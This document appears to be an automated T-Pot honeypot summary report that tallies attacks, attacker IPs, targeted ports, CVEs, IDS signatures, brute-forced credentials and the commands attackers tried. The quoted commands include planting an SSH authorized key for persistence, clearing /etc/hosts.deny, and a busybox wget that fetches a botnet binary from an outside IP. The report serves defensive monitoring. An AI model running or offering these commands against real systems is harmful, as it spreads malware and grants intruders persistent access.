Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-13T04:01:31Z
**Timeframe:** 2025-10-13T03:20:02Z to 2025-10-13T04:00:01Z
**Files Processed:**
- agg_log_20251013T032002Z.json
- agg_log_20251013T034001Z.json
- agg_log_20251013T040001Z.json

### Executive Summary

This report summarizes 27,713 events collected from T-Pot honeypots over a 40-minute period. The majority of attacks were captured by the Honeytrap, Dionaea, and Cowrie honeypots. The most targeted service was SMB on port 445. A significant number of attacks originated from the IP address 45.58.127.135. Attackers were observed attempting to exploit several vulnerabilities, including CVE-2016-5696, and executing commands to download and execute malicious files.

### Detailed Analysis

**Attacks by Honeypot:**
- Honeytrap: 9654
- Dionaea: 7871
- Cowrie: 7034
- Ciscoasa: 1327
- Suricata: 1045
- Sentrypeer: 567
- ConPot: 71
- Tanner: 73
- H0neytr4p: 35
- Mailoney: 12
- Redishoneypot: 6
- Adbhoney: 5
- Honeyaml: 6
- Miniprint: 3
- Dicompot: 2
- ElasticPot: 1
- Medpot: 1

**Top Attacking IPs:**
- 45.58.127.135: 8151
- 103.184.72.162: 3394
- 125.160.133.66: 3096
- 71.41.130.50: 1652
- 203.78.147.68: 1139
- 165.227.174.138: 323
- 185.50.38.169: 372
- 2.59.156.61: 309
- 109.195.108.173: 262
- 103.97.177.230: 249
- 62.141.43.183: 248
- 172.86.95.98: 203
- 101.47.5.97: 206
- 125.31.2.160: 209
- 110.49.3.33: 149
- 152.32.129.236: 149
- 143.198.225.212: 189
- 61.219.181.31: 236
- 220.247.223.56: 169
- 211.219.22.213: 168
- 170.254.229.191: 167
- 52.66.182.227: 144
- 106.58.215.67: 103
- 179.43.150.26: 113
- 45.119.81.249: 98
- 156.236.31.46: 45
- 143.110.230.197: 30
- 3.131.215.38: 21

**Top Targeted Ports/Protocols:**
- 445: 7207
- 22: 1101
- 5060: 567
- TCP/21: 167
- 80: 66
- 21: 88
- 5903: 110
- 8333: 64
- TCP/22: 66
- 1025: 42
- 443: 35
- 5908: 49
- 5909: 48
- 5901: 43
- TCP/80: 27
- 27017: 27
- 10001: 26
- TCP/1433: 14
- 1433: 13
- UDP/161: 16
- 5907: 28
- 8117: 14
- 3333: 11
- 10443: 7
- 4433: 7
- 10003: 6
- 30001: 6
- 25: 6
- 6379: 6
- 30002: 5
- 81: 5
- TCP/8090: 5
- 8001: 5
- 5984: 4

**Most Common CVEs:**
- CVE-2016-5696
- CVE-2002-0013 CVE-2002-0012
- CVE-2024-4577 CVE-2002-0953
- CVE-2024-4577 CVE-2024-4577
- CVE-2021-41773 CVE-2021-41773 CVE-2021-41773 CVE-2021-41773
- CVE-2021-42013 CVE-2021-42013
- CVE-2019-11500 CVE-2019-11500
- CVE-2019-12263 CVE-2019-12261 CVE-2019-12260 CVE-2019-12255
- CVE-2006-2369
- CVE-2021-35394 CVE-2021-35394

**Commands Attempted by Attackers:**
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `cat /proc/cpuinfo | grep name | wc -l`
- `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `ls -lh $(which ls)`
- `which ls`
- `crontab -l`
- `w`
- `uname -m`
- `cat /proc/cpuinfo | grep model | grep name | wc -l`
- `top`
- `uname`
- `uname -a`
- `whoami`
- `lscpu | grep Model`
- `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
- `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`
- `uname -s -v -n -r -m`
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`

**Signatures Triggered:**
- ET DROP Dshield Block Listed Source group 1
- 2402000
- ET FTP FTP PWD command attempt without login
- 2010735
- ET FTP FTP CWD command attempt without login
- 2010731
- ET SCAN NMAP -sS window 1024
- 2009582
- ET SCAN Potential SSH Scan
- 2001219
- ET INFO Reserved Internal IP Traffic
- 2002752
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- 2023753
- ET EXPLOIT RST Flood With Window
- 2023141
- ET SCAN Suspicious inbound to MSSQL port 1433
- 2010935
- ET DROP Spamhaus DROP Listed Traffic Inbound group 29
- 2400028
- ET CINS Active Threat Intelligence Poor Reputation IP group 49
- 2403348
- ET CINS Active Threat Intelligence Poor Reputation IP group 42
- 2403341
- ET CINS Active Threat Intelligence Poor Reputation IP group 45
- 2403344
- ET INFO CURL User Agent
- 2002824
- ET CINS Active Threat Intelligence Poor Reputation IP group 43
- 2403342
- ET CINS Active Threat Intelligence Poor Reputation IP group 68
- 2403367

**Users / Login Attempts:**
- 345gs5662d34/345gs5662d34
- root/3245gs5662d34
- root/121212
- vpn/vpnpass
- support/p@ssw0rd
- centos/123123123
- admin1234/admin1234
- admin1234/3245gs5662d34
- holu/holu
- root/ZAQ@#$,.
- root/evgeniyb
- mega/123
- root/a12345
- botuser/123123
- config/123123
- ftpuser/ftppassword
- haha/123
- root/789654
- root/adminonta
- root/123456aaA
- root/qayqayqay
- root/123qwe123QWE
- root/manager108

**Files Uploaded/Downloaded:**
- mpsl;
- sh
- arm.urbotnetisass;
- arm.urbotnetisass
- arm5.urbotnetisass;
- arm5.urbotnetisass
- arm6.urbotnetisass;
- arm6.urbotnetisass
- arm7.urbotnetisass;
- arm7.urbotnetisass
- x86_32.urbotnetisass;
- x86_32.urbotnetisass
- mips.urbotnetisass;
- mips.urbotnetisass
- mipsel.urbotnetisass;
- mipsel.urbotnetisass

**HTTP User-Agents:**
- N/A

**SSH Clients and Servers:**
- N/A

**Top Attacker AS Organizations:**
- N/A

### Key Observations and Anomalies

- A large number of attacks from 45.58.127.135 targeting a wide variety of ports.
- The command `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...` indicates an attempt to download and execute malware on Android devices.
- The frequent use of commands to gather system information (`uname`, `lscpu`, `free`, etc.) suggests attackers are performing reconnaissance before deploying payloads.
- The command `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys` is a common technique to establish persistent access to a compromised machine.
